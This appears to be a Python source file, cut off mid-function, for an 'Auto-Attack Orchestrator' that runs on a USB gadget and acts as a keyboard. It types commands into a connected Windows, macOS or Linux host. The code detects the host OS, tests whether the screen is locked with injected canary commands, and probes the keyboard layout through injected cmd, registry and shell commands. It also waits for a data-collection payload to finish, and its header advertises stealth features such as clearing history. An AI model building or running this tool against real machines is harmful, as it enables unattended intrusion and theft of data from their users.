#!/usr/bin/env python3
"""
Auto-Attack Orchestrator v3 — Multi-Target Edition

Full rewrite with:
  1. Multi-target profiles — each host gets targets/HOSTNAME_TIMESTAMP/
  2. Speed-optimised HID injection (0.008s per char, minimal delays)
  3. Stealth mode — close terminal after payload, clear history
  4. Windows / macOS / Linux / Android support
  5. Robust OS detection (raw image scan + mount fallback)
  6. Keyboard-layout aware HID injection (US, FR, DE)
  7. Adaptive wait with payload completion marker
  8. Per-target AES-256-GCM encryption
  9. LED status feedback via GPIO

Author: Mr.D137
License: MIT (Authorized Penetration Testing Only)
"""

from __future__ import annotations

import glob
import hashlib
import json
import logging
import os
import struct
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# ── Path bootstrap ──────────────────────────────────────────────────
_THIS_DIR = Path(__file__).resolve().parent
_PROJECT_ROOT = _THIS_DIR.parent
for _p in (str(_THIS_DIR), str(_PROJECT_ROOT), str(_PROJECT_ROOT / "src")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from tools.encrypt_data import SecureDataHandler

logger = logging.getLogger(__name__)

# ────────────────────────────────────────────────────────────────────
#  USB HID key code tables
# ────────────────────────────────────────────────────────────────────

_SHIFT = 0x02
_GUI   = 0x08
_ALT   = 0x04
_CTRL  = 0x01
_ALTGR = 0x40   # Right Alt — used as AltGr on international layouts

# US QWERTY layout (default)
# fmt: off
_LAYOUT_US: Dict[str, Tuple[int, int]] = {
    'a': (0, 0x04), 'b': (0, 0x05), 'c': (0, 0x06), 'd': (0, 0x07),
    'e': (0, 0x08), 'f': (0, 0x09), 'g': (0, 0x0A), 'h': (0, 0x0B),
    'i': (0, 0x0C), 'j': (0, 0x0D), 'k': (0, 0x0E), 'l': (0, 0x0F),
    'm': (0, 0x10), 'n': (0, 0x11), 'o': (0, 0x12), 'p': (0, 0x13),
    'q': (0, 0x14), 'r': (0, 0x15), 's': (0, 0x16), 't': (0, 0x17),
    'u': (0, 0x18), 'v': (0, 0x19), 'w': (0, 0x1A), 'x': (0, 0x1B),
    'y': (0, 0x1C), 'z': (0, 0x1D),
    'A': (_SHIFT, 0x04), 'B': (_SHIFT, 0x05), 'C': (_SHIFT, 0x06),
    'D': (_SHIFT, 0x07), 'E': (_SHIFT, 0x08), 'F': (_SHIFT, 0x09),
    'G': (_SHIFT, 0x0A), 'H': (_SHIFT, 0x0B), 'I': (_SHIFT, 0x0C),
    'J': (_SHIFT, 0x0D), 'K': (_SHIFT, 0x0E), 'L': (_SHIFT, 0x0F),
    'M': (_SHIFT, 0x10), 'N': (_SHIFT, 0x11), 'O': (_SHIFT, 0x12),
    'P': (_SHIFT, 0x13), 'Q': (_SHIFT, 0x14), 'R': (_SHIFT, 0x15),
    'S': (_SHIFT, 0x16), 'T': (_SHIFT, 0x17), 'U': (_SHIFT, 0x18),
    'V': (_SHIFT, 0x19), 'W': (_SHIFT, 0x1A), 'X': (_SHIFT, 0x1B),
    'Y': (_SHIFT, 0x1C), 'Z': (_SHIFT, 0x1D),
    '1': (0, 0x1E), '2': (0, 0x1F), '3': (0, 0x20), '4': (0, 0x21),
    '5': (0, 0x22), '6': (0, 0x23), '7': (0, 0x24), '8': (0, 0x25),
    '9': (0, 0x26), '0': (0, 0x27),
    ' ': (0, 0x2C), '-': (0, 0x2D), '=': (0, 0x2E), '[': (0, 0x2F),
    ']': (0, 0x30), '\\': (0, 0x31), ';': (0, 0x33), "'": (0, 0x34),
    '`': (0, 0x35), ',': (0, 0x36), '.': (0, 0x37), '/': (0, 0x38),
    '!': (_SHIFT, 0x1E), '@': (_SHIFT, 0x1F), '#': (_SHIFT, 0x20),
    '$': (_SHIFT, 0x21), '%': (_SHIFT, 0x22), '^': (_SHIFT, 0x23),
    '&': (_SHIFT, 0x24), '*': (_SHIFT, 0x25), '(': (_SHIFT, 0x26),
    ')': (_SHIFT, 0x27), '_': (_SHIFT, 0x2D), '+': (_SHIFT, 0x2E),
    '{': (_SHIFT, 0x2F), '}': (_SHIFT, 0x30), '|': (_SHIFT, 0x31),
    ':': (_SHIFT, 0x33), '"': (_SHIFT, 0x34), '~': (_SHIFT, 0x35),
    '<': (_SHIFT, 0x36), '>': (_SHIFT, 0x37), '?': (_SHIFT, 0x38),
    '\n': (0, 0x28), '\t': (0, 0x2B),
}

# ── French AZERTY — COMPLETE standalone mapping ──────────────────
# Built from scratch (no US inheritance) so no symbol leaks through.
# Covers every printable ASCII char used in injection commands.
#
# Physical AZERTY number-row  (bare / Shift / AltGr):
#   & 1   é 2 ~   " 3 #   ' 4 {   ( 5 [   - 6 |
#   è 7 `   _ 8 \   ç 9 ^   à 0 @   ) ° ]   = + }
#
# Bottom row: w x c v b n  , ;  : /  ! §
# Extra ISO 102nd key: < >
_LAYOUT_FR: Dict[str, Tuple[int, int]] = {
    # ── Lowercase letters (AZERTY positions) ──
    'a': (0, 0x14), 'b': (0, 0x05), 'c': (0, 0x06), 'd': (0, 0x07),
    'e': (0, 0x08), 'f': (0, 0x09), 'g': (0, 0x0A), 'h': (0, 0x0B),
    'i': (0, 0x0C), 'j': (0, 0x0D), 'k': (0, 0x0E), 'l': (0, 0x0F),
    'm': (0, 0x33), 'n': (0, 0x11), 'o': (0, 0x12), 'p': (0, 0x13),
    'q': (0, 0x04), 'r': (0, 0x15), 's': (0, 0x16), 't': (0, 0x17),
    'u': (0, 0x18), 'v': (0, 0x19), 'w': (0, 0x1D), 'x': (0, 0x1B),
    'y': (0, 0x1C), 'z': (0, 0x1A),
    # ── Uppercase letters ──
    'A': (_SHIFT, 0x14), 'B': (_SHIFT, 0x05), 'C': (_SHIFT, 0x06),
    'D': (_SHIFT, 0x07), 'E': (_SHIFT, 0x08), 'F': (_SHIFT, 0x09),
    'G': (_SHIFT, 0x0A), 'H': (_SHIFT, 0x0B), 'I': (_SHIFT, 0x0C),
    'J': (_SHIFT, 0x0D), 'K': (_SHIFT, 0x0E), 'L': (_SHIFT, 0x0F),
    'M': (_SHIFT, 0x33), 'N': (_SHIFT, 0x11), 'O': (_SHIFT, 0x12),
    'P': (_SHIFT, 0x13), 'Q': (_SHIFT, 0x04), 'R': (_SHIFT, 0x15),
    'S': (_SHIFT, 0x16), 'T': (_SHIFT, 0x17), 'U': (_SHIFT, 0x18),
    'V': (_SHIFT, 0x19), 'W': (_SHIFT, 0x1D), 'X': (_SHIFT, 0x1B),
    'Y': (_SHIFT, 0x1C), 'Z': (_SHIFT, 0x1A),
    # ── Digits (Shift + number row on AZERTY) ──
    '1': (_SHIFT, 0x1E), '2': (_SHIFT, 0x1F), '3': (_SHIFT, 0x20),
    '4': (_SHIFT, 0x21), '5': (_SHIFT, 0x22), '6': (_SHIFT, 0x23),
    '7': (_SHIFT, 0x24), '8': (_SHIFT, 0x25), '9': (_SHIFT, 0x26),
    '0': (_SHIFT, 0x27),
    # ── Number-row bare keys (symbols without Shift) ──
    '&': (0, 0x1E),         # 1-key bare
    '"': (0, 0x20),          # 3-key bare
    "'": (0, 0x21),          # 4-key bare
    '(': (0, 0x22),          # 5-key bare
    '-': (0, 0x23),          # 6-key bare
    '_': (0, 0x25),          # 8-key bare
    ')': (0, 0x2D),          # US-minus position bare
    '=': (0, 0x2E),          # same position as US
    # ── Other bare keys ──
    '$': (0, 0x30),          # US-] position bare
    '*': (0, 0x31),          # key next to Enter on ISO (US \| position)
    ',': (0, 0x10),          # US-m position
    ';': (0, 0x36),          # US-, position
    ':': (0, 0x37),          # US-. position
    '!': (0, 0x38),          # US-/ position
    '<': (0, 0x64),          # 102nd key (ISO extra key)
    ' ': (0, 0x2C),          # Space
    # ── Shift variants ──
    '.': (_SHIFT, 0x36),     # Shift + ;-position
    '/': (_SHIFT, 0x37),     # Shift + :-position
    '?': (_SHIFT, 0x10),     # Shift + ,-position (US m)
    '+': (_SHIFT, 0x2E),     # Shift + =
    '%': (_SHIFT, 0x34),     # Shift + ù-key
    '>': (_SHIFT, 0x64),     # Shift + 102nd key
    # ── AltGr variants (Right Alt = 0x40) ──
    '~': (_ALTGR, 0x1F),     # AltGr + 2
    '#': (_ALTGR, 0x20),     # AltGr + 3
    '{': (_ALTGR, 0x21),     # AltGr + 4
    '[': (_ALTGR, 0x22),     # AltGr + 5
    '|': (_ALTGR, 0x23),     # AltGr + 6
    '`': (_ALTGR, 0x24),     # AltGr + 7
    '\\': (_ALTGR, 0x25),    # AltGr + 8
    '^': (_ALTGR, 0x26),     # AltGr + 9
    '@': (_ALTGR, 0x27),     # AltGr + 0
    ']': (_ALTGR, 0x2D),     # AltGr + )-key
    '}': (_ALTGR, 0x2E),     # AltGr + =-key
    # ── Special keys ──
    '\n': (0, 0x28),         # Enter
    '\t': (0, 0x2B),         # Tab
}

# German QWERTZ layout remapping
_LAYOUT_DE: Dict[str, Tuple[int, int]] = {
    **_LAYOUT_US,
    'y': (0, 0x1D), 'z': (0, 0x1C),
    'Y': (_SHIFT, 0x1D), 'Z': (_SHIFT, 0x1C),
}

LAYOUTS = {
    "us": _LAYOUT_US,
    "fr": _LAYOUT_FR,
    "de": _LAYOUT_DE,
}
# fmt: on


# ────────────────────────────────────────────────────────────────────
#  HID Keyboard
# ────────────────────────────────────────────────────────────────────

class HIDKeyboard:
    """Send HID boot-protocol reports to /dev/hidg0."""

    REPORT_LEN = 8

    def __init__(self, device: str = "/dev/hidg0", layout: str = "us"):
        self.device = device
        self.layout_name = layout
        self.char_map = LAYOUTS.get(layout, _LAYOUT_US)

    def _write(self, report: bytes) -> None:
        with open(self.device, "wb") as f:
            f.write(report)

    def _release(self) -> None:
        self._write(b'\x00' * self.REPORT_LEN)

    def press(self, modifier: int = 0, *keys: int) -> None:
        report = bytearray(self.REPORT_LEN)
        report[0] = modifier
        for i, k in enumerate(keys[:6]):
            report[2 + i] = k
        self._write(bytes(report))
        time.sleep(0.015)
        self._release()
        time.sleep(0.015)

    def type_string(self, text: str, delay: float = 0.008) -> None:
        """Type a string character by character. Speed: ~0.008s per char."""
        for ch in text:
            entry = self.char_map.get(ch)
            if entry is None:
                logger.warning("Unmappable char skipped: %r (layout=%s)", ch, self.layout_name)
                continue
            mod, key = entry
            self.press(mod, key)
            time.sleep(delay)

    def enter(self) -> None:
        self.press(0, 0x28)
        time.sleep(0.04)

    def gui(self, key: int = 0) -> None:
        self.press(_GUI, key)
        time.sleep(0.25)

    def gui_r(self) -> None:
        """Win+R — Run dialog."""
        self.gui(0x15)

    def ctrl_alt_t(self) -> None:
        """Ctrl+Alt+T — open terminal on many Linux DEs."""
        self.press(_CTRL | _ALT, 0x17)
        time.sleep(0.4)

    def type_line(self, text: str) -> None:
        self.type_string(text)
        self.enter()

    def escape(self) -> None:
        self.press(0, 0x29)

    def tab(self) -> None:
        self.press(0, 0x2B)

    def caps_lock(self) -> None:
        self.press(0, 0x39)

    def alt_f4(self) -> None:
        """Alt+F4 — close current window (Linux/Windows)."""
        self.press(_ALT, 0x3D)
        time.sleep(0.1)

    def ctrl_d(self) -> None:
        """Ctrl+D — close terminal (EOF)."""
        self.press(_CTRL, 0x07)
        time.sleep(0.1)

    def ctrl_w(self) -> None:
        """Ctrl+W — close tab/window."""
        self.press(_CTRL, 0x1A)
        time.sleep(0.1)

    def cmd_q(self) -> None:
        """Cmd+Q — quit application (macOS)."""
        self.press(_GUI, 0x14)
        time.sleep(0.1)

    def cmd_w(self) -> None:
        """Cmd+W — close window (macOS)."""
        self.press(_GUI, 0x1A)
        time.sleep(0.1)

    # ── Mobile / navigation keys ──────────────────────────────────

    def home_key(self) -> None:
        """Home key — Android home button, desktop Home."""
        self.press(0, 0x4A)
        time.sleep(0.2)

    def arrow_down(self, count: int = 1) -> None:
        for _ in range(count):
            self.press(0, 0x51)
            time.sleep(0.05)

    def arrow_up(self, count: int = 1) -> None:
        for _ in range(count):
            self.press(0, 0x52)
            time.sleep(0.05)

    def arrow_right(self, count: int = 1) -> None:
        for _ in range(count):
            self.press(0, 0x4F)
            time.sleep(0.05)

    def arrow_left(self, count: int = 1) -> None:
        for _ in range(count):
            self.press(0, 0x50)
            time.sleep(0.05)

    def backspace(self) -> None:
        self.press(0, 0x2A)
        time.sleep(0.03)

    def delete_fwd(self) -> None:
        self.press(0, 0x4C)
        time.sleep(0.03)

    def meta_key(self) -> None:
        """Meta/Super key alone — app search on Android launchers."""
        self.press(_GUI)
        time.sleep(0.3)

    def ctrl_l(self) -> None:
        """Ctrl+L — focus URL / address bar in browsers."""
        self.press(_CTRL, 0x0F)
        time.sleep(0.2)

    def ctrl_a(self) -> None:
        """Ctrl+A — select all."""
        self.press(_CTRL, 0x04)
        time.sleep(0.1)

    def ctrl_c(self) -> None:
        """Ctrl+C — copy."""
        self.press(_CTRL, 0x06)
        time.sleep(0.1)

    def page_down(self) -> None:
        self.press(0, 0x4E)
        time.sleep(0.05)

    def page_up(self) -> None:
        self.press(0, 0x4B)
        time.sleep(0.05)

    # ── Layout-independent typing (Alt+Numpad) ──────────────────────

    # Numpad scancodes (HID Usage Page 0x07)
    _NUMPAD = {
        '0': 0x62, '1': 0x59, '2': 0x5A, '3': 0x5B,
        '4': 0x5C, '5': 0x5D, '6': 0x5E, '7': 0x5F,
        '8': 0x60, '9': 0x61,
    }

    def type_char_alt_code(self, ch: str) -> None:
        """Type one character via Alt+Numpad ASCII code.

        This bypasses the host keyboard layout entirely:
        Hold Left Alt, press numpad digits for the ASCII code, release Alt.
        Works on Windows regardless of QWERTY/AZERTY/QWERTZ/etc.
        """
        code = str(ord(ch))
        for digit in code:
            report = bytearray(self.REPORT_LEN)
            report[0] = _ALT            # Left Alt held
            report[2] = self._NUMPAD[digit]
            self._write(bytes(report))
            time.sleep(0.025)
            # Release numpad key, keep Alt held
            report = bytearray(self.REPORT_LEN)
            report[0] = _ALT
            self._write(bytes(report))
            time.sleep(0.020)
        # Release Alt → character emitted by Windows
        self._release()
        time.sleep(0.035)

    def type_string_alt_codes(self, text: str) -> None:
        """Type a whole string via Alt+Numpad codes.

        ~0.12s per character (slower than direct, but layout-independent).
        Only use for short strings like probe commands.
        """
        for ch in text:
            if ch == '\n':
                self.enter()
                time.sleep(0.05)
            elif ch == ' ':
                self.press(0, 0x2C)  # Space is universal (same on all layouts)
                time.sleep(0.02)
            else:
                self.type_char_alt_code(ch)

    def switch_layout(self, layout: str) -> None:
        """Hot-swap the character→scancode map to a different layout."""
        if layout in LAYOUTS:
            self.char_map = LAYOUTS[layout]
            self.layout_name = layout
            logger.info("Keyboard layout switched to: %s", layout)

    @property
    def available(self) -> bool:
        return os.path.exists(self.device)


# ────────────────────────────────────────────────────────────────────
#  GPIO LED
# ────────────────────────────────────────────────────────────────────

class StatusLED:
    """GPIO LED for status feedback."""

    def __init__(self, pin: int = 17):
        self.pin = pin
        self.gpio_dir = Path(f"/sys/class/gpio/gpio{pin}")
        self._init()

    def _init(self) -> None:
        try:
            if not self.gpio_dir.exists():
                Path("/sys/class/gpio/export").write_text(str(self.pin))
            (self.gpio_dir / "direction").write_text("out")
        except (PermissionError, OSError):
            pass

    def on(self) -> None:
        try:
            (self.gpio_dir / "value").write_text("1")
        except (PermissionError, OSError):
            pass

    def off(self) -> None:
        try:
            (self.gpio_dir / "value").write_text("0")
        except (PermissionError, OSError):
            pass

    def blink(self, count: int = 3, interval: float = 0.2) -> None:
        for _ in range(count):
            self.on(); time.sleep(interval)
            self.off(); time.sleep(interval)

    def pattern(self, pattern_str: str, unit: float = 0.15) -> None:
        """Blink a pattern like '..---...' (short/long)."""
        for ch in pattern_str:
            if ch == '.':
                self.on(); time.sleep(unit)
            elif ch == '-':
                self.on(); time.sleep(unit * 3)
            self.off(); time.sleep(unit)


# ────────────────────────────────────────────────────────────────────
#  Robust OS Detection  (raw image scan + mount fallback)
# ────────────────────────────────────────────────────────────────────

def _scan_raw_image(image_path: str) -> Optional[str]:
    """Scan the raw FAT32 image for OS-specific byte patterns.

    This bypasses the mount entirely — the mass-storage gadget writes
    directly to the backing file, so our reads see host changes in
    real time (unlike a stale loop-mount).
    """
    mac_sigs = [b".DS_Stor", b".Spotligh", b".fseventsd", b".Trashes"]
    win_sigs = [b"SYSTEM~1", b"System Volume", b"$RECYCLE",
                b"desktop.ini", b"Thumbs.db"]
    lin_sigs = [b".Trash-1", b".Trash-0"]
    # Android MTP doesn't write to mass storage, but some older
    # Android devices create .android_secure or LOST.DIR
    android_sigs = [b".android_secure", b"LOST.DIR", b"Android"]
    # ChromeOS creates specific directories when it mounts USB
    chromeos_sigs = [b".crdownload", b"Downloads"]

    try:
        with open(image_path, "rb") as f:
            # Root directory + first FAT cluster area (first 4 MB is enough)
            data = f.read(4 * 1024 * 1024)
    except OSError:
        return None

    for sig in mac_sigs:
        if sig in data:
            return "macos"
    for sig in win_sigs:
        if sig in data:
            return "windows"
    for sig in android_sigs:
        if sig in data:
            return "android"
    for sig in chromeos_sigs:
        if sig in data:
            return "chromeos"
    for sig in lin_sigs:
        if sig in data:
            return "linux"
    return None


def detect_host_os(
    mount: str = "/mnt/usb_share",
    timeout: float = 15.0,
    image_path: str = "/piusb.bin",
) -> str:
    """
    Detect host OS via two parallel strategies:

    1. **Raw image scan** — read /piusb.bin directly for OS artefacts.
       This works because the mass-storage gadget writes to the file
       through the page cache, and our fresh reads see those changes.
    2. **Mounted-dir check** — fall back to checking the loop mount
       (may be stale but catches some edge cases).

    If neither strategy returns a result, we default to **linux**:
    macOS and Windows *always* create metadata (Spotlight, System
    Volume Information) within seconds.  If we see nothing, the host
    is almost certainly a Linux desktop that auto-mounted without
    leaving artefacts.

    Returns "windows" | "macos" | "linux" | "android" | "ios" | "chromeos"
    """
    mac_mount = [".DS_Store", ".Spotlight-V100", ".fseventsd", ".Trashes"]
    win_mount = ["desktop.ini", "System Volume Information",
                 "$RECYCLE.BIN", "RECYCLER", "Thumbs.db"]
    lin_mount = [".Trash-1000", ".Trash-0"]
    android_mount = [".android_secure", "LOST.DIR", "Android"]
    chromeos_mount = [".crdownload"]

    mp = Path(mount)
    deadline = time.monotonic() + timeout

    while time.monotonic() < deadline:
        # ── Strategy 1: raw image bytes ──
        raw_result = _scan_raw_image(image_path)
        if raw_result:
            logger.info("OS detected via raw image scan: %s", raw_result)
            return raw_result

        # ── Strategy 2: mounted directory check ──
        if mp.is_dir():
            if any((mp / s).exists() for s in mac_mount):
                logger.info("OS detected via mount artefact: macos")
                return "macos"
            if any((mp / s).exists() for s in win_mount):
                logger.info("OS detected via mount artefact: windows")
                return "windows"
            if any((mp / s).exists() for s in android_mount):
                logger.info("OS detected via mount artefact: android")
                return "android"
            if any((mp / s).exists() for s in chromeos_mount):
                logger.info("OS detected via mount artefact: chromeos")
                return "chromeos"
            if any((mp / s).exists() for s in lin_mount):
                logger.info("OS detected via mount artefact: linux")
                return "linux"

        time.sleep(1.0)

    # No artefacts found → macOS/Windows always leave traces,
    # so the host is almost certainly Linux.
    logger.info(
        "No OS artefacts found after %.0fs — defaulting to linux", timeout
    )
    return "linux"


# ────────────────────────────────────────────────────────────────────
#  Screen Lock Detection
# ────────────────────────────────────────────────────────────────────

class ScreenLockDetector:
    """
    Detect if the host screen is locked by writing a canary file
    via HID keystrokes and checking if it appears on the drive.

    Strategy:
      1. Type a command that creates a small file on the USB drive
      2. Wait briefly and check if the file appeared
      3. If yes → screen is unlocked and commands are executing
      4. If no  → screen is likely locked
    """

    def __init__(self, kb: HIDKeyboard, mount: str = "/mnt/usb_share"):
        self.kb = kb
        self.mount = Path(mount)
        self.canary_name = ".canary_unlock"

    def is_unlocked(self, os_type: str, timeout: float = 8.0) -> bool:
        """
        Attempt a lightweight canary command.
        Returns True if screen appears unlocked.
        """
        canary_path = self.mount / self.canary_name

        # Remove old canary
        canary_path.unlink(missing_ok=True)

        if os_type == "windows":
            # Win+R → cmd /c echo 1 > <drive>\.canary_unlock → close
            self.kb.gui_r()
            time.sleep(0.7)
            # Find drive letter via label
            cmd = (
                'cmd /c "for %d in (C D E F G H I J K L) do '
                '(if exist %d:\\desktop.ini echo 1>%d:\\.canary_unlock)"'
            )
            self.kb.type_line(cmd)
        elif os_type == "macos":
            # Just touch a file via Spotlight → Terminal (quick one-liner)
            self.kb.gui(0x2C)  # Cmd+Space
            time.sleep(0.5)
            self.kb.type_string("Terminal")
            time.sleep(0.3)
            self.kb.enter()
            time.sleep(1.0)
            cmd = (
                'vol=$(ls -d /Volumes/CYBERSEC* /Volumes/TRUSTED* 2>/dev/null|head -1);'
                f'[ -n "$vol" ] && touch "$vol/{self.canary_name}"; exit'
            )
            self.kb.type_line(cmd)
        else:
            return True  # Assume unlocked for unknown OS

        # Poll for canary file
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if canary_path.exists():
                canary_path.unlink(missing_ok=True)
                logger.info("Screen UNLOCKED confirmed via canary")
                return True
            time.sleep(0.5)

        logger.warning("Screen appears LOCKED — canary not found after %.0fs", timeout)
        return False


# ────────────────────────────────────────────────────────────────────
#  Adaptive Wait — wait for payload output instead of fixed sleep
# ────────────────────────────────────────────────────────────────────

def adaptive_wait(mount: str, marker: str = "collection_summary.txt",
                  timeout: float = 60.0, poll: float = 1.0) -> bool:
    """
    Wait until the payload writes a known marker file, rather than
    sleeping a fixed duration. Falls back to timeout.
    """
    mp = Path(mount)
    deadline = time.monotonic() + timeout

    while time.monotonic() < deadline:
        if (mp / marker).exists():
            logger.info("Payload completed — marker file detected")
            return True
        time.sleep(poll)

    logger.warning("Payload did not produce marker within %.0fs", timeout)
    return False


# ────────────────────────────────────────────────────────────────────
#  Keyboard Layout Detection (auto + manual + live probe)
# ────────────────────────────────────────────────────────────────────

# Windows registry keyboard layout IDs → our layout names
_WIN_LAYOUT_MAP: Dict[str, str] = {
    "00000409": "us",  # English (US)
    "00000809": "us",  # English (UK) — close enough for symbols
    "00001009": "us",  # English (Canada)
    "00001409": "us",  # English (New Zealand)
    "00000c09": "us",  # English (Australia)
    "0000040c": "fr",  # French (France)
    "00000c0c": "fr",  # French (Canada)
    "0000080c": "fr",  # French (Belgium)
    "0000100c": "fr",  # French (Switzerland)
    "00000407": "de",  # German (Germany)
    "00000807": "de",  # German (Swiss)
    "00000c07": "de",  # German (Austria)
    "00000410": "us",  # Italian — US-like symbols
    "00000c0a": "us",  # Spanish — US-like for our purposes
    "00000816": "us",  # Portuguese — US-like
}


def detect_keyboard_layout(mount: str = "/mnt/usb_share") -> str:
    """
    Check for a layout hint file on the drive (pre-set by the operator)
    or default to 'us'.

    The operator can create a file called `.kb_layout` containing
    the layout code (us, fr, de, etc.) before deploying the device.
    If the hint file contains 'auto', live probing will be used later.
    """
    hint = Path(mount) / ".kb_layout"
    if hint.exists():
        try:
            layout = hint.read_text().strip().lower()
            if layout == "auto":
                logger.info("Keyboard layout hint = 'auto' → will probe live")
                return "auto"
            if layout in LAYOUTS:
                logger.info("Keyboard layout from hint file: %s", layout)
                return layout
            logger.warning("Unknown layout '%s' in hint file, falling back to 'us'", layout)
        except OSError:
            pass
    return "us"


def probe_keyboard_layout_live(
    kb: HIDKeyboard,
    os_type: str,
    mount: str,
    image: str,
) -> str:
    """
    Auto-detect the target keyboard layout by sending a probe command
    and reading the result back from the USB drive.

    Works by using layout-independent input methods:
    - Windows: Alt+Numpad ASCII codes (bypass layout entirely)
    - Linux:   Ctrl+Alt+T is layout-independent; localectl output
    - macOS:   Cmd+Space is layout-independent; defaults command

    Returns: layout name ('us', 'fr', 'de') or 'us' as fallback.
    """
    probe_file = Path(mount) / ".ldetect"
    probe_file.unlink(missing_ok=True)
    logger.info("Starting live keyboard layout probe for OS=%s", os_type)

    if os_type == "windows":
        return _probe_windows(kb, mount, image)
    elif os_type == "linux":
        return _probe_linux(kb, mount, image)
    elif os_type == "macos":
        return _probe_macos(kb, mount, image)
    else:
        logger.info("No layout probe for OS=%s, defaulting to 'us'", os_type)
        return "us"


def _probe_windows(kb: HIDKeyboard, mount: str, image: str) -> str:
    """
    Probe Windows keyboard layout via Alt+Numpad typing:
    1. Win+R → 'cmd' (via Alt codes) → Enter
    2. In cmd: for each drive letter D-I, check if .kb_layout exists,
       then run 'reg query' to get keyboard layout ID → write to .ldetect
    3. Close cmd ('exit')
    4. Remount USB and read .ldetect
    5. Parse registry output → return layout
    """
    # 1. Open Run dialog (Win+R — layout-independent modifier combo)
    kb.gui_r()
    time.sleep(0.8)

    # 2. Type 'cmd' via Alt codes and run it
    kb.type_string_alt_codes("cmd")
    kb.enter()
    time.sleep(1.5)

    # 3. Type probe command via Alt codes
    #    This finds the TRUSTED USB drive and queries keyboard layout from registry
    #    ~90 chars, takes ~11s via Alt codes
    cmd = (
        'for %d in (D E F G H I J K L) do @if exist %d:\\.kb_layout '
        '(reg query "HKCU\\Keyboard Layout\\Preload" /v 1 >%d:\\.ldetect 2>&1'
        ' & exit /b)\r\n'
    )
    # Type all but the final newline via Alt codes, then press Enter
    cmd_body = cmd.rstrip('\r\n')
    kb.type_string_alt_codes(cmd_body)
    kb.enter()
    time.sleep(3.0)

    # 4. Close cmd window
    kb.type_string_alt_codes("exit")
    kb.enter()
    time.sleep(1.0)

    # 5. Remount USB image and read the probe result
    subprocess.run(["umount", mount], check=False, capture_output=True)
    time.sleep(0.5)
    ret = subprocess.run(
        ["mount", "-o", "loop,ro", image, mount],
        check=False, capture_output=True,
    )
    if ret.returncode != 0:
        logger.warning("Could not remount USB for layout probe")
        return "us"

    probe_path = Path(mount) / ".ldetect"
    layout = "us"
    if probe_path.exists():
        content = probe_path.read_text(errors="ignore").lower().strip()
        logger.info("Layout probe result: %s", content[:200])
        for lid, lname in _WIN_LAYOUT_MAP.items():
            if lid in content:
                layout = lname
                logger.info("Detected Windows keyboard layout: %s (registry ID=%s)", layout, lid)
                break
        else:
            logger.warning("Could not match layout ID in probe output, defaulting to 'us'")
    else:
        logger.warning("Layout probe file not found — drive letter might differ, defaulting to 'us'")

    # Cleanup: unmount, remount RW, delete probe file
    subprocess.run(["umount", mount], check=False, capture_output=True)
    subprocess.run(
        ["mount", "-o", "loop", image, mount],
        check=False, capture_output=True,
    )
    try:
        probe_path = Path(mount) / ".ldetect"
        probe_path.unlink(missing_ok=True)
    except OSError:
        pass
    subprocess.run(["sync"], check=False)
    return layout


def _probe_linux(kb: HIDKeyboard, mount: str, image: str) -> str:
    """
    Probe Linux keyboard layout:
    1. Ctrl+Alt+T (layout-independent — opens terminal on most DEs)
    2. Type probe command using Alt codes (xdotool handles this)
    3. Read result from USB

    Fallback: check locale from /etc files during mount-based OS detection.
    """
    # Ctrl+Alt+T is guaranteed layout-independent
    kb.ctrl_alt_t()
    time.sleep(1.5)

    # setxkbmap -query outputs "layout:     fr" etc.
    # localectl shows keyboard layout
    # We pipe both to the USB via a find command (find the TRUSTED mount)
    # Use Alt codes for the command since we don't know the layout
    cmd = (
        'f=$(findmnt -rno TARGET -S LABEL=TRUSTED 2>/dev/null||'
        'find /media /run/media /mnt -maxdepth 3 -name .kb_layout '
        '-exec dirname {} \\; 2>/dev/null|head -1);'
        '[ -n "$f" ]&&(setxkbmap -query 2>/dev/null;localectl 2>/dev/null;'
        'cat /etc/default/keyboard 2>/dev/null)>"$f/.ldetect";exit'
    )
    kb.type_string_alt_codes(cmd)
    kb.enter()
    time.sleep(3.0)

    # Remount and read
    subprocess.run(["umount", mount], check=False, capture_output=True)
    time.sleep(0.5)
    subprocess.run(
        ["mount", "-o", "loop,ro", image, mount],
        check=False, capture_output=True,
    )

    layout = "us"
    probe_path = Path(mount) / ".ldetect"
    if probe_path.exists():
        content = probe_path.read_text(errors="ignore").lower()
        logger.info("Linux layout probe: %s", content[:200])
        if "layout:" in content:
            # Parse 'layout:     fr' from setxkbmap -query
            for line in content.splitlines():
                if "layout:" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        detected = parts[1].strip().split(",")[0].strip()
                        if detected in LAYOUTS:
                            layout = detected
                            logger.info("Detected Linux layout: %s", layout)
                        break
        elif "xkblayout" in content:
            # Parse XKBLAYOUT="fr" from /etc/default/keyboard
            for line in content.splitlines():
                if "xkblayout" in line:
                    val = line.split("=")[-1].strip().strip('"').strip("'").split(",")[0]
                    if val in LAYOUTS:
                        layout = val
                        logger.info("Detected Linux layout from /etc/default/keyboard: %s", layout)
                    break

    # Cleanup
    subprocess.run(["umount", mount], check=False, capture_output=True)
    subprocess.run(
        ["mount", "-o", "loop", image, mount],
        check=False, capture_output=True,
    )
    try:
        probe_path = Path(mount) / ".ldetect"
        probe_path.unlink(missing_ok=True)
    except OSError:
        pass
    subprocess.run(["sync"], check=False)
    return layout


def _probe_macos(kb: HIDKeyboard, mount: str, image: str) -> str:
    """
    Probe macOS keyboard layout via Spotlight → Terminal.
    Cmd+Space is layout-independent. Type probe via Alt codes.
    """
    kb.gui(0x2C)  # Cmd+Space (Spotlight)
    time.sleep(0.8)
    # 'Terminal' — typed via Alt codes for layout independence
    kb.type_string_alt_codes("Terminal")
    kb.enter()
    time.sleep(1.5)

    # Query the keyboard layout from macOS defaults
    cmd = (
        'v=$(ls -d /Volumes/TRUSTED* 2>/dev/null|head -1);'
        '[ -n "$v" ]&&defaults read ~/Library/Preferences/'
        'com.apple.HIToolbox AppleCurrentKeyboardLayoutInputSourceID '
        '>"$v/.ldetect" 2>&1;exit'
    )
    kb.type_string_alt_codes(cmd)
    kb.enter()
    time.sleep(3.0)

    # Remount and read
    subprocess.run(["umount", mount], check=False, capture_output=True)
    time.sleep(0.5)
    subprocess.run(
        ["mount", "-o", "loop,ro", image, mount],
        check=False, capture_output=True,
    )

    layout = "us"
    probe_path = Path(mount) / ".ldetect"
    if probe_path.exists():
        content = probe_path.read_text(errors="ignore").lower()
        logger.info("macOS layout probe: %s", content[:200])
        if "french" in content:
